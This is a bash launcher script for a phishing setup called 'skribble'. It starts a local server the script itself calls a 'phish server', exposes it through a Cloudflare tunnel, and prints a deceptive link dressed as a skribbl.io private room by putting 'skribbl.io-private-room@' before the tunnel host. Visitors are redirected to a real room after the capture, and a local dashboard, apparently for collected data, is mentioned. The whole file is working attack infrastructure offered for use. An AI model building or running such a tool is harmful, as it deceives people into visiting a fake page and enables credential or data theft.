#!/usr/bin/env bash
# skribble launcher — everything lives in this folder, nothing from /tmp
# Usage: bash launch.sh [room_url]

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SERVER="$DIR/server.py"
CLOUDFLARED="$DIR/cloudflared"
CONFIG="$DIR/config.txt"
LOG_SERVER="$DIR/server.log"
LOG_CF="$DIR/cloudflared.log"

# --- Get room URL ---
if [ -n "$1" ]; then
  ROOM_URL="$1"
else
  echo -n "Enter skribbl.io room link (e.g. https://skribbl.io/?abc123): "
  read -r ROOM_URL
fi

[ -z "$ROOM_URL" ] && { echo "ERROR: No room URL provided."; exit 1; }

echo "$ROOM_URL" > "$CONFIG"
echo "[skribble] Redirect → $ROOM_URL"

# --- Kill any previous instance ---
pkill -f "python3 $SERVER" 2>/dev/null || true
pkill -f "$CLOUDFLARED tunnel" 2>/dev/null || true
sleep 1

# --- Start Flask server ---
python3 "$SERVER" >> "$LOG_SERVER" 2>&1 &
SERVER_PID=$!
echo "[skribble] Server PID=$SERVER_PID"
sleep 3

HTTP=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" http://localhost:8080/)
[ "$HTTP" != "200" ] && { echo "ERROR: phish server not responding (HTTP $HTTP)"; tail -10 "$LOG_SERVER"; exit 1; }
echo "[skribble] ✓ Phish:     http://localhost:8080"
echo "[skribble] ✓ Dashboard: http://localhost:8181"

# --- Start Cloudflare tunnel ---
"$CLOUDFLARED" tunnel --url http://localhost:8080 --no-autoupdate > "$LOG_CF" 2>&1 &
CF_PID=$!
echo "[skribble] Cloudflared PID=$CF_PID — waiting for URL…"

for i in $(seq 1 35); do
  TUNNEL_URL=$(grep -oP 'https://[a-z0-9\-]+\.trycloudflare\.com' "$LOG_CF" 2>/dev/null | head -1)
  [ -n "$TUNNEL_URL" ] && break
  sleep 1
done

[ -z "$TUNNEL_URL" ] && { echo "ERROR: Cloudflare tunnel failed."; tail -5 "$LOG_CF"; exit 1; }

HTTP=$(curl -sL --max-time 10 -o /dev/null -w "%{http_code}" "$TUNNEL_URL/")
[ "$HTTP" != "200" ] && { echo "ERROR: Tunnel returned HTTP $HTTP"; exit 1; }

HOST=$(echo "$TUNNEL_URL" | sed 's|https://||')

echo ""
echo "╔══════════════════════════════════════════════════════════════════════╗"
echo "║  skribble is LIVE                                                    ║"
echo "╠══════════════════════════════════════════════════════════════════════╣"
printf "║  Plain URL   : %-53s║\n" "$TUNNEL_URL"
printf "║  Masked URL  : https://skribbl.io-private-room@%-22s║\n" "$HOST"
echo "║  Dashboard   : http://localhost:8181                                 ║"
printf "║  Redirects → : %-53s║\n" "$ROOM_URL"
echo "╚══════════════════════════════════════════════════════════════════════╝"
